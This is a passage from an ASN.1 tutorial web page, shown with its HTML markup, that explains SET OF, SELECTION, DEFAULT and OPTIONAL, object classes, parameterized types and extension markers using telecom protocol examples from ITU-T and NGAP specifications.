MatchingRuleAssertion</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the quite complex example above we see that the type <code>FilterItem</code>
is of type <code>CHOICE</code> and can take subtype called <code>strings</code>. <code>strings</code>
is of type <code>SEQUENCE OF CHOICE</code> which means it can take a list of
zero, one or more of <code>initial</code>, <code>any</code> or <code>final</code>. The example is quite
complex because it also uses multiple parameterized values. see
<a href="#automatic-implicit-explicit-tags">Automatic, Implicit, Explicit tags</a></p><p>We find another example in the DialoguePDUs module from
<a href="https://www.itu.int/rec/T-REC-Q.773-199706-I/en" target="_blank" rel="noopener noreferrer">Q.773</a> where the
AARQ is of type <code>SEQUENCE</code>, and the third field <code>user-information</code> is
an <code>SEQUENCE OF</code> <code>EXTERNAL</code> type.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  protocol-version</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  application-context-name  [1]  OBJECT IDENTIFIER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>They are quite different in how they are used, but they are encoded in
a similar way. Some languages represent <code>SEQUENCE</code> internally as a
<code>struct</code>, and <code>SEQUENCE OF</code> as an array, but encoded they would look
quite similar.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="set-of">SET (OF)<a class="hash-link" href="#set-of" title="Direct link to heading">​</a></h3><p><code>SET</code> and <code>SET OF</code> are similar to <code>SEQUENCE</code> and <code>SEQUENCE OF</code>
respectively. The difference is that the composite types are
unordered.</p><p>From <code>CAP-datatypes</code> we find an example of a <code>SET OF</code> with a
<a href="#parameterized-components">parameterized component</a> specifying a size
constraint.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Or an example of a value from the <code>TCAP-Tools</code> module in
<a href="https://www.itu.int/rec/T-REC-Q.775-199706-I/en" target="_blank" rel="noopener noreferrer">Q.775</a></p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancelFailed ERROR ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  PARAMETER</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    SET {problem   [0]  CancelProblem,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">         invokeId  [1]  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="selection">SELECTION<a class="hash-link" href="#selection" title="Direct link to heading">​</a></h3><p>The SELECTION type <code>&lt;</code> is used when one want's to obtain one of the
possible subtypes of a <code>CHOICE</code> definition.</p><p>If we expand the previous example from the <a href="#set-of">SET</a></p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancel OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ARGUMENT  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS    {cancelFailed}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">cancelFailed ERROR ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  PARAMETER</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    SET {problem   [0]  CancelProblem,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">         invokeId  [1]  present &lt; TCInvokeIdSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>we see that the <code>ARGUMENT</code> type and the invokeId field take the type
from the <code>present</code> field in the <code>TCInvokeIdSet</code> type.</p><p>the definition of <code>TCInvokeIdSet</code> is as follows</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeId ::= CHOICE {present  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                     absent   NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TCInvokeIdSet ::= InvokeId(WITH COMPONENTS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                             present  (-128..127)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                           })</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thus <code>invokeId</code> and <code>ARGUMENT</code> fields will take integer values which
are between -128 and 127.</p><h1>Other concepts</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="default-and-optional-keywords">DEFAULT and OPTIONAL keywords<a class="hash-link" href="#default-and-optional-keywords" title="Direct link to heading">​</a></h2><p>One can use the <code>DEFAULT</code> keyword in order to specify the default value.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CollectedDigits ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  maximumNbOfDigits    [1] INTEGER (1..16),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceInformation     [9] BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceBack            [10] BOOLEAN DEFAULT FALSE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In this example we see the type <code>CollectedDigits</code> where most of the
values are either <code>DEFAULT</code> or <code>OPTIONAL</code>. The only value that needs
to be set is <code>maximumNbOfDigits</code>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="classes">Classes<a class="hash-link" href="#classes" title="Direct link to heading">​</a></h2><p>One can also use informal object classes in order to specify and
define values for general types.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">OPERATION ::= CLASS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ArgumentType          OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;argumentTypeOptional  BOOLEAN OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;returnResult          BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ResultType            OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;resultTypeOptional    BOOLEAN OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;Errors                ERROR OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;Linked                OPERATION OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;synchronous           BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;alwaysReturns         BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;InvokePriority        Priority OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;ResultPriority        Priority OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  &amp;operationCode         Code UNIQUE OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">WITH SYNTAX {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ARGUMENT &amp;ArgumentType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   [OPTIONAL &amp;argumentTypeOptional]]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RESULT &amp;ResultType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   [OPTIONAL &amp;resultTypeOptional]]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RETURN RESULT &amp;returnResult]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ERRORS &amp;Errors]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [LINKED &amp;Linked]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [SYNCHRONOUS &amp;synchronous]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [ALWAYS RESPONDS &amp;alwaysReturns]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [INVOKE PRIORITY &amp;InvokePriority]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [RESULT-PRIORITY &amp;ResultPriority]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  [CODE &amp;operationCode]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">provideRoutingInformation OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ARGUMENT  RequestArgument</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  RESULT    RoutingInformation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    {invalidCalledNumber | subscriberNotReachable | calledBarred |</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      processingFailure}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  LINKED    {getCallingPartyAddress}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">getCallingPartyAddress OPERATION ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  RESULT  CallingPartyAddress</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ERRORS  {callingPartyAddressNotAvailable | processingFailure}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">invalidCalledNumber ERROR ::= {CODE  local:1}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">subscriberNotReachable ERROR ::= {CODE  local:2}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">RequestArgument ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  calledNumber  IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  basicService  BasicServiceIndicator OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">RoutingInformation ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  reroutingNumber    [0] IMPLICIT IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  forwardedToNumber  [1] IMPLICIT IsdnNumber</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the above <code>OPERATION</code> class, a syntax is defined for the
class. This class and syntax can then be used to define specific
values, for instance the <code>provideRoutingInformation</code> and
<code>getCallingPartyAddress</code> values.</p><p>We also glimse another class in the above example which I didn't
include. Can you find it?</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="parameterized-components">Parameterized components<a class="hash-link" href="#parameterized-components" title="Direct link to heading">​</a></h2><p>Another way to make the specs more generalized is to use parameterized
components. We've already seen a couple of examples of such, see the
chapter for the <a href="#null">NULL</a>, <a href="#external">EXTERNAL</a> and <a href="#set-of">SET
(OF)</a> types.</p><p>Let's look at the example from <code>SET OF</code> again.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">GenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bound.&amp;minGenericNumberLength .. bound.&amp;maxGenericNumberLength))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>GenericNumbers</code> take a parameter <code>bound</code> of the type <code>PARAMETERS-BOUND</code> as input.</p><p><code>PARAMETERS-BOUND</code> is defined as a class with a lot of different
integer values, so I've minimized the class a bit.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">PARAMETERS-BOUND ::= CLASS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- a lot of other fields</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;minGenericNumberLength  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;maxGenericNumberLength  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;numOfGenericNumbers     INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">WITH SYNTAX {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- a lot of other fields</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MINIMUM-FOR-GENERIC-NUMBER  &amp;minGenericNumberLength</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MAXIMUM-FOR-GENERIC-NUMBER  &amp;maxGenericNumberLength</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NUM-OF-GENERIC-NUMBERS      &amp;numOfGenericNumbers</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>One could then specify different values using the <code>PARAMETERS-BOUND</code>
class to reuse the <code>GenericNumber</code> and <code>GenericNumbers</code> types.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cAPSpecificBoundSet PARAMETERS-BOUND ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- again, lots of other values</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MINIMUM-FOR-GENERIC-NUMBER                  3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MAXIMUM-FOR-GENERIC-NUMBER                  11</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NUM-OF-GENERIC-NUMBERS                      5</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If one would pass <code>cAPSpecificBoundSet</code> to a value of type
<code>GenericNumbers</code>, it would define an instance which holds 1-5
<code>GenericNumber</code>s of 3-11 octets.</p><p>Quite powerful if you have multiple definitions which uses similar
structure.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="extensions">Extensions<a class="hash-link" href="#extensions" title="Direct link to heading">​</a></h2><p>Sometimes you will need to support different versions of a protocol
(or someone else need to support different version, and you just need
to read the types of the protocol), and maybe the new version need to
extend some types in order to include more information. Then without
redefining everything and copy the previous version of the type to the
new version of the type one can use extension markers (syntax <code>...</code>).</p><p>Take the <code>QosMonitoringRequest</code> type below as an example. In the first
version of the protocol (NGAP if you really want to know), the
<code>QoSMonitoringRequest</code> could take only enums <code>ul</code>, <code>dl</code>, or <code>both</code>.
However, in a subsequent version it was extended with a new enum
<code>stop</code>. With the extension marker <code>...</code> the v1-compilers can handle
the first three enums, and the v2-compilers can handle all enums from
v1 but also the <code>stop</code> enum.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    stop</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- version 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For enums, if there is yet a 